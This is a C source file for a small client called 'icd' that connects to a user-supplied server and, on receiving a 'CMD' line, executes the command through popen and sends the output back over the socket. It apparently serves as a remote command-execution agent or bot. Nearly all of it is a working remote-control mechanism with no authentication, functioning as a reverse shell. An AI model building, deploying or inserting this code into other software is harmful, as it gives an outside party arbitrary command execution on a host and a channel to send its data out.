/*
 * Copyright (c) 2010 John Gordon <jgor@indiecom.org>
 *   and Doug Farre <dougfarre@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <limits.h>
#include <string.h>
#include <search.h>
#include "icd.h"
#include "sock.h"

#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>


#define MAXDATASIZE 256

#define MAX_BUF 256

void print_version() {
  printf("icd v0.1\n");
  exit(EXIT_SUCCESS);
}

void print_help() {
  printf("Usage: icd -[hv] [-p PORT -a ADDRESS]\n");
  printf("\n");
  printf("Options:\n");
  printf("  -p, --port=PORT port number on the ircss server\n");
  printf("  -a, --address=ADDRESS ipv4/6 address of the ircss server\n");
  printf("  -h, --help        display this screen\n");
  printf("  -v, --version     display version\n");
  exit(EXIT_SUCCESS);
}

static struct option long_options[] = {
  {"port",    1, 0, 'p'},
  {"address", 1, 0, 'a'},
  {"help",    0, 0, 'h'},
  {"version", 0, 0, 'v'},
  {0, 0, 0, 0}
};

int main(int argc, char **argv) {
  int c;
  char *port, *address, str[LINE_MAX] = "", *ret;
  extern char *optarg;
  extern int optind;
  pthread_t pt_irc, pt_ss;
  int irc_port, ss_port;
  
  while (1) {
    int option_index = 0;

    c = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index);

    if (c == -1)
      break;

    switch(c) {
      case 'p':
        port = optarg;
        break;
      case 'a':
        address = optarg;
        break;
      case 'v':
        print_version();
        break;
      case 'h':
      default:
        print_help();
        break;
    }
  }

  if (optind < argc) {
    strncat(str, argv[optind++], LINE_MAX - strlen(str));
    while (optind < argc) {
      strcat(str, " ");
      strncat(str, argv[optind++], LINE_MAX - strlen(str));
    }
  }

  /*real code starts here*/
  int sockfd, numbytes, rv;
  char buf[MAXDATASIZE];
  struct addrinfo hints, *servinfo, *p;
  char s[INET6_ADDRSTRLEN];

  memset(&hints, 0, sizeof hints);
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  
  /* this does stuff */
  if ((rv = getaddrinfo(address, port, &hints, &servinfo)) != 0) {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
    return 1;
  }
  
  /*loop through all the results and connect ot the first possible*/
  for (p = servinfo; p != NULL; p = p->ai_next) {
    if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      perror("client: socket");
      continue;
    }
  
    if (connect(sockfd, p-> ai_addr, p->ai_addrlen) == -1) {
      close(sockfd);
      perror("client: connect");
      continue;
    }
 
    break;
  }
 
  if (p == NULL) {
    fprintf(stderr, "client: failed to connect\n");
    return 2;
  }

  inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr), s, sizeof s);
  printf("client: connected to %s\n", s);
  
  freeaddrinfo(servinfo); //dont need servinfo anymore

  while (1) {
    char * pch;

    numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0);
    if (numbytes == -1) error("ERROR on recv");
    else if (numbytes == 0) break;

    buf[numbytes] = '\0';
   
    if (DEBUG == 1)
      printf("client: received %s\n", buf);

    pch = strtok(buf, " ");

    while (pch != NULL) {
      if (strcmp(pch, "CMD") == 0) {
        pch = strtok(NULL, "\r\n");
        //system(pch);
        FILE *fp;
        int status, err;
        char line[MAX_BUF + 1];
        char str[MAX_BUF + 5];

        fp = popen(pch, "r");
        if (fp == NULL) error("ERROR: popen");

        while (fgets(line, MAX_BUF, fp) != NULL) {
          strcpy(str, "MSG ");
          strcat(str, line);
          err = write(sockfd, str, strlen(str)); 
          if (err == -1) error("ERROR on write");
        }

        status = pclose(fp);
        if (status == -1) error("ERROR: pclose");
      }       
      
      break;
      //pch = strok(NULL, " ");
      
    }
    
  }

  close(sockfd);

  return 0;
 
  //exit(EXIT_SUCCESS);
}

